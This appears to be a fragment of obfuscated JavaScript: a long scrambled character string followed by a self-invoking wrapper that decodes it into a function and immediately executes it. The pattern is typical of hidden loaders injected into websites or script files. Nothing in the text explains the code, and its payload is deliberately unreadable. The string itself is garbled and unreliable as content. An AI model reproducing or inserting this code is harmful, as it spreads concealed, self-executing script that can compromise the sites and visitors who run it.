iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()



